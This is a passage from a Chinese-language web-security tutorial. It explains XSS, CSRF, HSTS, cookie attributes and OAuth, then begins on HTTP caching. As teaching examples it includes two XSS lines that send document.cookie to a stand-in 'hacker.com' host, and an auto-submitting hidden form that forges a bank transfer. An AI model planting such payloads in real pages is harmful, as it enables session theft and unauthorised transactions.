基础设施</li></ul><blockquote><p>在 90% 的服务器推送场景中，SSE 相比 WebSocket 可减少 40% 开发量</p></blockquote><h1 id="三、网络安全"><a href="#三、网络安全" class="headerlink" title="三、网络安全"></a>三、网络安全</h1><h2 id="3-1-攻击防护"><a href="#3-1-攻击防护" class="headerlink" title="3.1 攻击防护"></a>3.1 攻击防护</h2><h3 id="XSS（跨站脚本）与防御（内容编码-CSP）"><a href="#XSS（跨站脚本）与防御（内容编码-CSP）" class="headerlink" title="XSS（跨站脚本）与防御（内容编码&#x2F;CSP）"></a>XSS（跨站脚本）与防御（内容编码&#x2F;CSP）</h3><p><strong>XSS攻击原理与分类</strong></p><p>定义：攻击者向网页注入恶意脚本，当用户访问时脚本在浏览器执行，窃取数据或篡改页面。</p><p>攻击类型：</p><table><thead><tr><th align="left">类型</th><th align="left">注入方式</th><th align="left">案例场景</th></tr></thead><tbody><tr><td align="left">存储型XSS</td><td align="left">恶意脚本存入数据库（如评论&#x2F;消息）</td><td align="left">用户浏览含攻击脚本的论坛页面</td></tr><tr><td align="left">反射型XSS</td><td align="left">脚本通过URL参数注入并即时返回</td><td align="left">钓鱼邮件诱导点击含恶意URL</td></tr><tr><td align="left">DOM型XSS</td><td align="left">前端JS操作DOM时注入</td><td align="left">innerHTML加载未过滤数据</td></tr></tbody></table><p>危害示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 窃取Cookie的恶意脚本</span><br>&lt;script&gt;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>核心防御方案</strong></p><p>(1) 内容编码（输出转义）</p><p>原则：所有不可信数据输出前必须转义！</p><p>转义规则：</p><table><thead><tr><th align="left">输出位置</th><th align="left">转义方法</th><th align="left">代码示例（JavaScript）</th></tr></thead><tbody><tr><td align="left">HTML正文</td><td align="left">转义 &lt; &gt; &amp; ‘ “</td><td align="left">const safeStr &#x3D; str.replace(&#x2F;[&amp;&lt;&gt;”‘]&#x2F;g, m &#x3D;&gt; &amp;${htmlEscapes[m]};)</td></tr><tr><td align="left">HTML属性</td><td align="left">转义 “ ‘ 并包裹在引号中</td><td align="left"><code>&lt;div data-value=&quot;$&#123;escapeAttr(value)&#125;&quot;&gt;</code></td></tr><tr><td align="left">JavaScript</td><td align="left">转义 \ ‘ “ &lt; &gt; &amp; + Unicode编码</td><td align="left">const jsSafe &#x3D; JSON.stringify(untrustedData);</td></tr><tr><td align="left">URL参数</td><td align="left">使用encodeURIComponent()</td><td align="left">href&#x3D;”&#x2F;search?q&#x3D;${encodeURIComponent(input)}”</td></tr></tbody></table><p>现代框架自定义转义：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JSX"><span class="hljs-comment">// React自动转义</span><br>&lt;div&gt;&#123;userInput&#125;&lt;/div&gt;<br><br><span class="hljs-comment">// Vue自动转义</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>&#123;&#123; userInput &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>(2) 内容安全策略（CSP）</p><p>原理：通过HTTP头定义可信资源白名单，阻止非法脚本执行。</p><p>关键指令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span><br>  default-src &#x27;self&#x27;;       // 默认仅允许同源<br>  script-src &#x27;self&#x27; https://trusted.cdn.com;  // 脚本来源<br>  style-src &#x27;self&#x27; &#x27;nonce-abc123&#x27;;  // 样式来源<br>  img-src *;                // 图片允许任意源<br>  connect-src https://api.example.com;  // 限制AJAX请求<br>  frame-ancestors &#x27;none&#x27;;   // 禁止嵌套<br>  report-uri /csp-report;   // 违规上报<br></code></pre></td></tr></table></figure><p>安全增强策略：</p><table><thead><tr><th align="left">策略</th><th align="left">作用</th><th align="left">示例指令</th></tr></thead><tbody><tr><td align="left">Nonce机制</td><td align="left">仅允许带特定随机数的脚本执行</td><td align="left">script-src ‘nonce-abc123’</td></tr><tr><td align="left">Hash白名单</td><td align="left">仅允许匹配哈希值的脚本</td><td align="left">script-src ‘sha256-xxxxx’</td></tr><tr><td align="left">严格动态</td><td align="left">禁止动态创建脚本（eval()&#x2F;setTimeout）</td><td align="left">‘strict-dynamic’</td></tr></tbody></table><p><strong>防御体系分层设计</strong></p><table><thead><tr><th align="left">层级</th><th align="left">防御措施</th><th align="left">有效性</th></tr></thead><tbody><tr><td align="left">输入层</td><td align="left">输入验证 + 过滤</td><td align="left">★★☆</td></tr><tr><td align="left">输出层</td><td align="left">内容编码（核心防线）</td><td align="left">★★★</td></tr><tr><td align="left">传输层</td><td align="left">HTTPS防止窃听</td><td align="left">★★☆</td></tr><tr><td align="left">协议层</td><td align="left">CSP（终极防护）</td><td align="left">★★★</td></tr><tr><td align="left">后置防护</td><td align="left">Cookie设置HttpOnly</td><td align="left">★★☆</td></tr></tbody></table><p><strong>实战代码示例</strong></p><p>(1) HTML 代码转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">const</span> map = &#123; <br>    <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>, <br>    <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>, <br>    <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>, <br>    <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span> <br>  &#125;;<br>  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, <span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> map[m]);<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) CSP 配置（Nginx）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">add_header</span> Content-Security-Policy <span class="hljs-string">&quot;default-src &#x27;self&#x27;; </span><br><span class="hljs-string">  script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https:; </span><br><span class="hljs-string">  img-src * data:; </span><br><span class="hljs-string">  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; </span><br><span class="hljs-string">  frame-ancestors &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="CSRF（跨站请求伪造）与Token验证"><a href="#CSRF（跨站请求伪造）与Token验证" class="headerlink" title="CSRF（跨站请求伪造）与Token验证"></a>CSRF（跨站请求伪造）与Token验证</h3><p><strong>CSRF 攻击原理</strong></p><p>定义：攻击者诱导用户在已登录状态下访问恶意页面，该页面伪造合法请求（如转账&#x2F;改密），利用浏览器的自动Cookie发送机制完成非授权操作。</p><p>攻击流程：</p><pre class="mermaid">sequenceDiagram    participant 用户    participant 银行网站    participant 恶意网站    用户->>银行网站: 正常登录（获得Session Cookie）    用户->>恶意网站: 访问钓鱼页面    恶意网站->>银行网站: 自动发送伪造请求（携带用户Cookie）    银行网站->>恶意网站: 执行操作（误认用户身份）</pre><p>攻击条件：</p><ol><li>用户已登录目标网站</li><li>网站依赖Cookie验证身份</li><li>用户主动访问恶意页面（含自动提交表单&#x2F;脚本）</li></ol><p>伪造请求示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 钓鱼页面隐藏表单 --&gt;<br>&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;<br>  &lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;hacker_account&quot;&gt;<br>  &lt;/form&gt;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><strong>Token验证防御机制</strong></p><p>核心原理：在请求中嵌入服务端生成的随机Token，验证请求是否来自真实页面（恶意网站无法获取Token）。</p><p>token 实现流程：</p><pre class="mermaid">sequenceDiagram    participant 用户    participant 前端    participant 后端    用户->>前端: 访问页面    前端->>后端: 请求页面    后端-->>前端: 返回HTML + CSRF Token（存入Session）    前端->>后端: 提交表单（携带Token）    后端->>后端: 验证Token匹配 → 执行操作</pre><p>token 生成与存储：</p><table><thead><tr><th align="left">位置</th><th align="left">生成方式</th><th align="left">存储位置</th></tr></thead><tbody><tr><td align="left">服务端</td><td align="left">加密随机字符串（如crypto.randomBytes(32)）</td><td align="left">Session&#x2F;Redis</td></tr><tr><td align="left">前端</td><td align="left">插入表单&#x2F;请求头</td><td align="left">表单隐藏域&#x2F;HTTP头</td></tr></tbody></table><p>前端集成示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 表单内嵌Token --&gt;<br>&lt;form action=&quot;/transfer&quot; method=&quot;POST&quot;&gt;<br>  &lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;token_value&quot;&gt; <br>  &lt;!-- 其他字段 --&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;!-- <span class="hljs-variable constant_">AJAX</span>请求携带<span class="hljs-title class_">Token</span> --&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/action&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;X-CSRF-Token&#x27;</span>: <span class="hljs-string">&#x27;token_value&#x27;</span>  <span class="hljs-comment">// 自定义请求头</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>服务端验证逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyCsrfToken</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">const</span> clientToken = req.<span class="hljs-property">body</span>.<span class="hljs-property">_csrf</span> || req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;x-csrf-token&#x27;</span>];<br>  <span class="hljs-keyword">const</span> serverToken = req.<span class="hljs-property">session</span>.<span class="hljs-property">csrfToken</span>; <span class="hljs-comment">// 从Session读取</span><br>  <br>  <span class="hljs-keyword">if</span> (!clientToken || clientToken !== serverToken) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;CSRF Token验证失败&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>防御体系分层加固</strong></p><table><thead><tr><th align="left">防御层</th><th align="left">措施</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Token验证</td><td align="left">同步器Token模式</td><td align="left">核心防御（阻断伪造请求）</td></tr><tr><td align="left">Cookie策略</td><td align="left">SameSite&#x3D;Strict&#x2F;Lax</td><td align="left">阻止第三方发送Cookie</td></tr><tr><td align="left">操作验证</td><td align="left">敏感操作需二次确认（密码&#x2F;OTP）</td><td align="left">增加攻击门槛</td></tr><tr><td align="left">Referer检查</td><td align="left">验证请求来源域名</td><td align="left">辅助防御（可被绕过）</td></tr></tbody></table><p>SameSite Cookie 示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 登录响应设置Cookie</span><br>res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;sessionID&#x27;</span>, <span class="hljs-string">&#x27;abc123&#x27;</span>, &#123;<br>  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">&#x27;strict&#x27;</span>,  <span class="hljs-comment">// 完全禁止第三方发送</span><br>  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>         <span class="hljs-comment">// 仅HTTPS传输</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Token 设计最佳实践</strong></p><ul><li>单次有效性：每次提交后刷新Token（防重放攻击）</li><li>绑定用户：Token关联用户ID（防不同用户间复用）</li><li>短时效性：设置Token有效期（如10分钟）</li><li>双重验证：关键操作组合Token + 生物认证</li></ul><p><strong>攻击场景对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">CSRF</th><th align="left">XSS</th></tr></thead><tbody><tr><td align="left">攻击目标</td><td align="left">利用用户身份执行操作</td><td align="left">窃取用户数据</td></tr><tr><td align="left">依赖条件</td><td align="left">用户登录状态 + 访问恶意页面</td><td align="left">网站存在注入漏洞</td></tr><tr><td align="left">防御核心</td><td align="left">Token验证 + SameSite Cookie</td><td align="left">输入输出过滤 + CSP</td></tr></tbody></table><h3 id="HTTPS混合内容风险与HSTS策略"><a href="#HTTPS混合内容风险与HSTS策略" class="headerlink" title="HTTPS混合内容风险与HSTS策略"></a>HTTPS混合内容风险与HSTS策略</h3><p><strong>混合内容风险</strong></p><p>定义：HTTPS页面中加载了通过HTTP协议传输的子资源（如图片&#x2F;脚本&#x2F;样式），导致页面安全等级被破坏。</p><p>攻击原理：</p><pre class="mermaid">sequenceDiagram    participant 用户    participant HTTPS网站    participant 攻击者    participant HTTP资源服务器    用户->>HTTPS网站: 访问https://example.com    HTTPS网站->>用户: 返回加密HTML    用户->>HTTP资源服务器: 请求http://cdn.com/script.js（未加密）    攻击者->>用户: 中间人劫持HTTP流量 → 注入恶意脚本    用户->>HTTPS网站: 执行被篡改脚本 → 数据泄露</pre><p>风险等级：</p><table><thead><tr><th align="left">类型</th><th align="left">危险度</th><th align="left">案例</th><th align="left">浏览器表现</th></tr></thead><tbody><tr><td align="left">主动混合内容</td><td align="left">★★★</td><td align="left"><code>&lt;script&gt;/&lt;iframe&gt;</code></td><td align="left">默认拦截</td></tr><tr><td align="left">被动混合内容</td><td align="left">★★☆</td><td align="left"><code>&lt;img&gt;/&lt;audio&gt;</code></td><td align="left">加载但显示”不安全”警告</td></tr></tbody></table><p><strong>HSTS（HTTP严格传输安全）策略</strong></p><p>核心目标：强制浏览器始终通过HTTPS访问网站，消除HTTP降级攻击风险。</p><p>HSTS 工作原理：</p><pre class="mermaid">sequenceDiagram    participant 浏览器    participant 网站服务器    浏览器->>网站服务器: 首次访问 https://example.com    网站服务器->>浏览器: 响应头: Strict-Transport-Security: max-age=31536000    Note right of 浏览器: 本地HSTS缓存生效    浏览器->>网站服务器: 后续所有请求自动HTTPS（即使输入http://）</pre><p>关键响应头指令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Strict-Transport-Security</span><span class="hljs-punctuation">: </span><br>  max-age=31536000;           // 有效期1年（秒）<br>  includeSubDomains;          // 保护所有子域名<br>  preload                    // 申请加入浏览器预加载列表<br></code></pre></td></tr></table></figure><p>防御效果对比:</p><table><thead><tr><th align="left">攻击类型</th><th align="left">无防护</th><th align="left">HSTS启用后</th></tr></thead><tbody><tr><td align="left">SSL剥离攻击</td><td align="left">❌ 可能降级到HTTP</td><td align="left">✔️ 强制HTTPS连接</td></tr><tr><td align="left">混合内容注入</td><td align="left">❌ 可劫持HTTP资源</td><td align="left">✔️ 自动升级资源请求</td></tr><tr><td align="left">Cookie劫持</td><td align="left">❌ 明文传输Cookie</td><td align="left">✔️ 全程加密</td></tr></tbody></table><p><strong>关键注意事项</strong></p><ul><li>回退风险：<ul><li>启用HSTS后若关闭HTTPS → 用户无法访问网站（直到max-age过期）</li><li>解决方案：部署时先设置较短max-age（如1小时）</li></ul></li><li>首次访问漏洞：<ul><li>用户首次访问<code>http://</code>时仍可能被劫持</li><li>终极方案：申请浏览器HSTS预加载列表（Chrome&#x2F;Firefox内置）</li></ul></li><li>测试环境规避:</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 开发环境禁用HSTS</span><br><span class="hljs-attribute">add_header</span> Strict-Transport-Security <span class="hljs-string">&quot;max-age=0;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>完整安全配置示例</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>  <span class="hljs-attribute">server_name</span> example.com;<br><br>  <span class="hljs-comment"># TLS配置</span><br>  <span class="hljs-attribute">ssl_certificate</span> /path/to/cert.pem;<br>  <span class="hljs-attribute">ssl_certificate_key</span> /path/to/key.pem;<br>  <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br><br>  <span class="hljs-comment"># HSTS配置（生产环境）</span><br>  <span class="hljs-attribute">add_header</span> Strict-Transport-Security <span class="hljs-string">&quot;max-age=31536000; includeSubDomains; preload&quot;</span>;<br><br>  <span class="hljs-comment"># 混合内容升级</span><br>  <span class="hljs-attribute">add_header</span> Content-Security-Policy <span class="hljs-string">&quot;upgrade-insecure-requests&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>upgrade-insecure-requests：自动将HTTP资源升级为HTTPS请求</p></blockquote><h2 id="3-2-安全实践"><a href="#3-2-安全实践" class="headerlink" title="3.2 安全实践"></a>3.2 安全实践</h2><h3 id="Cookie-安全属性（Secure-HttpOnly-SameSite）"><a href="#Cookie-安全属性（Secure-HttpOnly-SameSite）" class="headerlink" title="Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）"></a>Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）</h3><p><strong>Secure 属性</strong></p><p>作用：确保Cookie仅通过HTTPS加密连接传输，防止中间人窃听。</p><p>配置方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; Secure;  <br></code></pre></td></tr></table></figure><p>安全影响：</p><table><thead><tr><th align="left">场景</th><th align="left">无Secure</th><th align="left">启用Secure</th></tr></thead><tbody><tr><td align="left">HTTP明文请求</td><td align="left">Cookie明文传输 ❌</td><td align="left">不发送Cookie ✔️</td></tr><tr><td align="left">HTTPS加密请求</td><td align="left">正常发送 ✔️</td><td align="left">正常发送 ✔️</td></tr></tbody></table><blockquote><p>必须项：任何包含敏感信息（如会话ID）的Cookie必须设置Secure。</p></blockquote><p><strong>HttpOnly 属性</strong></p><p>作用：阻止JavaScript通过document.cookie访问Cookie，防范XSS攻击窃取。</p><p>配置方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; HttpOnly;  <br></code></pre></td></tr></table></figure><p>安全影响：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 恶意脚本尝试窃取Cookie</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.com?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>); <br><br><span class="hljs-comment">// 结果：</span><br><span class="hljs-comment">//   ❌ 无HttpOnly：成功窃取会话ID</span><br><span class="hljs-comment">//   ✔️ 有HttpOnly：document.cookie无法读取该Cookie</span><br></code></pre></td></tr></table></figure><blockquote><p>最佳实践：身份验证类Cookie必须启用HttpOnly。</p></blockquote><p><strong>SameSite 属性</strong></p><p>作用：控制Cookie在跨站请求中是否发送，防御CSRF攻击。</p><p>配置值：</p><table><thead><tr><th align="left">属性值</th><th align="left">跨站请求发送规则</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">Strict</td><td align="left">完全禁止跨站发送</td><td align="left">银行操作等高敏感场景</td></tr><tr><td align="left">Lax</td><td align="left">仅允许导航跳转（<code>&lt;a&gt;</code>链接）</td><td align="left">默认推荐值</td></tr><tr><td align="left">None</td><td align="left">允许跨站发送（需同时设置Secure）</td><td align="left">跨域单点登录(SSO)</td></tr></tbody></table><p>配置方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; SameSite=Lax;  <br></code></pre></td></tr></table></figure><p>跨站请求场景对比：</p><table><thead><tr><th align="left">请求类型</th><th align="left">SameSite&#x3D;Strict</th><th align="left">SameSite&#x3D;Lax</th><th align="left">SameSite&#x3D;None</th></tr></thead><tbody><tr><td align="left">直接地址栏输入</td><td align="left">✔️</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left"><code>&lt;a href&gt;</code>跳转</td><td align="left">❌</td><td align="left">✔️</td><td align="left">✔️</td></tr><tr><td align="left"><code>&lt;form&gt;</code>表单提交</td><td align="left">❌</td><td align="left">❌</td><td align="left">✔️</td></tr><tr><td align="left">AJAX跨域请求</td><td align="left">❌</td><td align="left">❌</td><td align="left">✔️</td></tr></tbody></table><p><strong>综合防御配置示例</strong></p><p>(1) 安全会话 Cookie 设置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span><br>  sessionId=abc123; <br>  Secure;          // 仅HTTPS传输<br>  HttpOnly;        // 阻止JS访问<br>  SameSite=Lax;    // 防御CSRF<br>  Path=/;          // 作用路径<br>  Max-Age=3600;    // 有效期（秒）<br></code></pre></td></tr></table></figure><p>(2) 跨域认证 Cookie（OAuth）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span><br>  oauth_token=xyz789; <br>  Secure; <br>  HttpOnly; <br>  SameSite=None;   // 允许跨站发送<br></code></pre></td></tr></table></figure><h3 id="OAuth-2-0授权流程"><a href="#OAuth-2-0授权流程" class="headerlink" title="OAuth 2.0授权流程"></a>OAuth 2.0授权流程</h3><pre class="mermaid">sequenceDiagram    participant User as 资源所有者 (用户)    participant Client as 客户端 (第三方应用)    participant AuthServer as 授权服务器 (如Google/Facebook)    participant ResourceServer as 资源服务器 (API服务)    Note over User,Client: 前置条件：客户端已在授权服务器注册<br>获得client_id和client_secret    User->>Client: 1. 点击"使用XX账号登录"    Client->>AuthServer: 2. 重定向到授权端点<br>?response_type=code<br>&client_id=CLIENT_ID<br>&redirect_uri=CALLBACK_URL<br>&scope=email profile<br>&state=RANDOM_STRING    AuthServer->>User: 3. 显示登录/授权页面    User->>AuthServer: 4. 输入凭证并授权    AuthServer->>Client: 5. 重定向到callback_uri<br>?code=AUTHORIZATION_CODE<br>&state=RANDOM_STRING    Client->>AuthServer: 6. POST令牌请求<br>grant_type=authorization_code<br>&code=AUTHORIZATION_CODE<br>&redirect_uri=CALLBACK_URL<br>&client_id=CLIENT_ID<br>&client_secret=CLIENT_SECRET    AuthServer->>Client: 7. 返回访问令牌<br>{access_token: "xxx",<br>token_type: "bearer",<br>expires_in: 3600,<br>refresh_token: "yyy"}    Client->>ResourceServer: 8. 携带令牌请求资源<br>Authorization: Bearer xxx    ResourceServer->>Client: 9. 返回受保护资源</pre><h1 id="四、性能优化"><a href="#四、性能优化" class="headerlink" title="四、性能优化"></a>四、性能优化</h1><h2 id="4-1-缓存策略"><a href="#4-1-缓存策略" class="headerlink" title="4.1 缓存策略"></a>4.1 缓存策略</h2><h3 id="强缓存（Cache-Control-Expires）与协商缓存（ETag-Last-Modified）"><a href="#强缓存（Cache-Control-Expires）与协商缓存（ETag-Last-Modified）" class="headerlink" title="强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）"></a>强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）</h3><p><strong>强缓存（本地缓存）</strong></p><p>浏览器不向服务器发送请求，直接使用本地缓存资源。</p><p>核心响应头：</p><table><thead><tr><th align="left">响应头</th><th align="left">优先级</th><th align="left">值格式</th><th align="left">示例</th><th align="left">特性说明</th></tr></thead><tbody><tr><td align="left">Cache-Control</td><td align="left">高</td><td align="left">指令组合</td><td align="left">max-age&#x3D;3600, public</td><td align="left">HTTP&#x2F;1.1标准，精确控制缓存</td></tr><tr><td align="left">Expires</td><td align="left">低</td><td align="left">GMT时间戳</td><td align="left">Expires: Wed, 21 Oct 2025 07:28:00 GMT</td><td align="left">HTTP&#x2F;1.0遗留，存在时区问题</td></tr></tbody></table><p>常见指令：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span><br>  max-age=3600,          // 缓存有效期（秒）<br>  public,               // 允许代理/CDN缓存<br>  immutable,            // 资源永不更新（适用于版本化文件）<br>  no-store,             // 禁止缓存（最高优先级）<br>  no-cache              // 需协商验证（非字面意思）<br></code></pre></td></tr></table></figure><p>工作流程：</p><pre class="mermaid">graph LR  A[浏览器请求资源] --> B{本地缓存是否有效？}  B -->|Cache-Control有效| C[直接使用缓存]  B -->|缓存失效| D[发起网络请求]</pre><p><strong>协商缓存（条件请求）</strong></p><p>浏览器携带验证信息请求服务器，由服务器决定是否返回资源（304复用缓存）。</p><p>核心头对：</p><table><thead><tr><th align="left">响应头</th><th align="left">请求头</th><th align="left">验证原理</th><th align="left">优先级</th></tr></thead><tbody><tr><td align="left">ETag</td><td align="left">If-None-Match</td><td align="left">资源内容哈希值（如”d53jk-“）</td><td align="left">高</td></tr><tr><td align="left">Last-Modified</td><td align="left">If-Modified-Since</td><td align="left">最后修改时间戳</td><td align="left">低</td></tr></tbody></table><p>工作流程：</p><pre class="mermaid">sequenceDiagram    participant Browser    participant Server    Browser->>Server: 首次请求 /style.css    Server->>Browser: 返回资源 + ETag: W/"d53jk-"    Browser->>Server: 二次请求（携带 If-None-Match: 